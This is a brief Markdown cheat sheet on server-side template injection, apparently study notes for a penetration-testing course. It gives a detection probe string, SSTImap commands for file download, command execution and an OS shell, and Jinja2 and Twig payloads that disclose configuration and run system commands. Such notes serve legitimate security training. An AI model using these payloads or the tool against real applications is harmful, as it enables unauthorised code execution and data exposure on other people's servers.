# Cheatsheet

[PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

| Command                                                     | Usage                                                                                                                             |
| ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `${{<%[%'"}}%\.`                                            | Identify SSTI existence. Next step is [[#Identifying the Engine]]                                                                 |
| `python3 ~/SSTImap/sstimap.py -u <URL>/<page>?<param>=test` | Tool for SSTI.<br><br>- downloading using `-D <filename>`<br>- RCE using `-S <command>`<br>- interactive shell using `--os-shell` |

Some payloads:

| ***Command***                                                                                                                                             | ***Usage***                         |
| --------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| **Jinja2**:<br>`{{ config.items() }}`<br><br>`{{ self.__init__.__globals__.__builtins__ }}`<br><br>**Twig:**<br>`{{ _self }}`                             | Information Disclosure through SSTI |
| **Jinja2**: <br>`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`<br><br>**Twig**:<br>`{{ ['id'] \| filter('system') }}` | RCE through SSTI                    |

## Identifying the Engine
![img](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)

> *Note*: For `{{7*'7'}}`, in Jinja = `777777`, in twig = `49`.

